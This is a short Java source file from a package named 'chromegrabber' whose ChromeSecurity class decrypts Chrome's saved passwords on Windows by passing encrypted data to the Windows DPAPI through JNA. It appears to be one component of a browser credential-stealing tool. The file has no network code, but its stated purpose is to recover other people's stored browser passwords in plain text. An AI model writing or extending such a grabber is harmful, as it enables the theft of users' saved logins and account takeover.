package chromegrabber;
import com.sun.jna.platform.win32.Crypt32Util;

// Utility class to provide multiple platform retrieval in the future
public final class ChromeSecurity {
	
	// Method to retrieve unencrypted Chrome passwords for: WINDOWS
	public static String getChromePasswords(final byte[] encryptedData) {
		
		// Use JNA to get win32 method access
		return new String(Crypt32Util.cryptUnprotectData(encryptedData));
		
	}

}
